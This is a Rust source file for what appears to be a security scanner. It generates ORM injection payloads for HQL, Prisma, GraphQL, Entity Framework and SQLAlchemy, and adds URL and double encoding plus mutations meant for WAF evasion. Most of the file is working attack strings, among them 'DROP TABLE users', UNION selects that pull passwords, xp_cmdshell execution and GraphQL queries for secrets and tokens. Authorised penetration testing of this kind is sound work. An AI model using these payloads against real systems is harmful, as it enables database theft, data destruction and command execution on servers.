//! ORM Payload Generation
//! Creates ORM-specific payload templates with comment, sorting, and filtering probes.
//! Implements bounded memory usage for 2GB RAM ceiling compliance.

use std::borrow::Cow;
use std::collections::VecDeque;

/// Bounded ORM payload generator
pub struct OrmPayloads {
    payload_queue: VecDeque<Cow<'static, str>>,
    max_payloads: usize,
    mutation_index: usize,
}

impl OrmPayloads {
    pub fn new(max_payloads: usize) -> Self {
        Self {
            payload_queue: VecDeque::with_capacity(max_payloads.min(1024)),
            max_payloads: max_payloads.min(1024),
            mutation_index: 0,
        }
    }

    /// Generate HQL comment-based payloads
    pub fn hql_comment_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "'--",
            "\"--",
            "/* Hibernate */",
            "' /*comment*/ OR '1'='1",
            "\" /*comment*/ OR \"1\"=\"1",
        ].into_iter()
    }

    /// Generate HQL ordering manipulation payloads
    pub fn hql_order_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "id ASC, (SELECT CASE WHEN (1=1) THEN id ELSE name END) DESC",
            "name; DROP TABLE users;--",
            "id UNION SELECT password FROM users--",
        ].into_iter()
    }

    /// Generate Prisma filter manipulation payloads
    pub fn prisma_filter_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{\"where\":{\"id\":{\"not\":null}}}",
            "{\"where\":{\"OR\":[{\"id\":{\"gt\":0}},{\"id\":{\"lt\":0}}]}}",
            "{\"where\":{\"NOT\":{\"id\":0}}}",
            "{\"where\":{\"AND\":[{\"status\":\"active\"},{\"role\":{\"not\":\"user\"}}]}}",
        ].into_iter()
    }

    /// Generate Prisma include/select manipulation payloads
    pub fn prisma_include_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{\"include\":{\"password\":true,\"secret\":true}}",
            "{\"select\":{\"*\":true}}",
            "{\"include\":{\"_count\":{\"select\":\"*\":true}}}",
        ].into_iter()
    }

    /// Generate GraphQL query payloads
    pub fn graphql_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "{__schema{types{name fields{name type{name}}}}}",
            "{users{password secret token}}",
            "query($id:String!){user(id:$id){name email}}",
            "{debug{dump}}",
        ].into_iter()
    }

    /// Generate entity framework payloads
    pub fn ef_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "'; DROP TABLE users;--",
            "' OR '1'='1' --",
            "1; EXEC xp_cmdshell('dir');--",
            "{\"$filter\":\"1 eq 1\"}",
        ].into_iter()
    }

    /// Generate SQLAlchemy payloads
    pub fn sqlalchemy_payloads(&self) -> impl Iterator<Item = &'static str> {
        [
            "__table__.query.filter(\"1=1\").all()",
            "session.query(User).filter(\"id=1 OR 1=1\")",
            "{\"or\":[{\"id\":1},{\"id\":2}]}",
        ].into_iter()
    }

    /// Generate URL-encoded ORM payloads for WAF evasion
    pub fn url_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.prisma_filter_payloads()
            .chain(self.graphql_payloads())
            .map(|p| self.url_encode(p))
    }

    /// Generate double-encoded payloads
    pub fn double_encoded_payloads(&self) -> impl Iterator<Item = String> {
        self.url_encoded_payloads().map(|p| self.url_encode(&p))
    }

    /// Queue a payload for later use
    pub fn queue_payload(&mut self, payload: Cow<'static, str>) {
        if self.payload_queue.len() >= self.max_payloads {
            self.payload_queue.pop_front();
        }
        self.payload_queue.push_back(payload);
    }

    /// Get queued payloads
    pub fn get_queued(&self) -> impl Iterator<Item = &Cow<'static, str>> {
        self.payload_queue.iter()
    }

    /// Mutate a base payload
    pub fn mutate(&mut self, base: &str) -> String {
        self.mutation_index = (self.mutation_index + 1) % 8;
        
        match self.mutation_index {
            0 => base.to_string(),
            1 => format!("{}--", base),
            2 => format!("{}/*{}*/", base, self.mutation_index),
            3 => self.url_encode(base),
            4 => base.replace("{", "{ ").replace("}", " }"),
            5 => base.to_uppercase(),
            6 => format!("{{\"$and\":[{}]}}", base.trim_matches(|c| c == '{' || c == '}')),
            _ => base.chars().rev().collect(),
        }
    }

    /// Clear the payload queue
    pub fn clear_queue(&mut self) {
        self.payload_queue.clear();
    }

    /// Get queue size
    pub fn queue_size(&self) -> usize {
        self.payload_queue.len()
    }

    /// Simple URL encoding
    fn url_encode(&self, s: &str) -> String {
        let mut result = String::with_capacity(s.len() * 2);
        for c in s.chars() {
            match c {
                'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => result.push(c),
                ' ' => result.push_str("%20"),
                '{' => result.push_str("%7B"),
                '}' => result.push_str("%7D"),
                '"' => result.push_str("%22"),
                ':' => result.push_str("%3A"),
                '[' => result.push_str("%5B"),
                ']' => result.push_str("%5D"),
                ',' => result.push_str("%2C"),
                '$' => result.push_str("%24"),
                '&' => result.push_str("%26"),
                '+' => result.push_str("%2B"),
                '=' => result.push_str("%3D"),
                '?' => result.push_str("%3F"),
                '/' => result.push_str("%2F"),
                '(' => result.push_str("%28"),
                ')' => result.push_str("%29"),
                '*' => result.push_str("%2A"),
                '%' => result.push_str("%25"),
                _ => result.push(c),
            }
        }
        result
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_hql_comment_payloads() {
        let payloads = OrmPayloads::new(100);
        let count: usize = payloads.hql_comment_payloads().count();
        assert_eq!(count, 5);
    }

    #[test]
    fn test_prisma_filter_payloads() {
        let payloads = OrmPayloads::new(100);
        let count: usize = payloads.prisma_filter_payloads().count();
        assert_eq!(count, 4);
    }

    #[test]
    fn test_queue_bounded() {
        let mut gen = OrmPayloads::new(3);
        for i in 0..5 {
            gen.queue_payload(Cow::Owned(format!("payload{}", i)));
        }
        assert_eq!(gen.queue_size(), 3);
    }
}
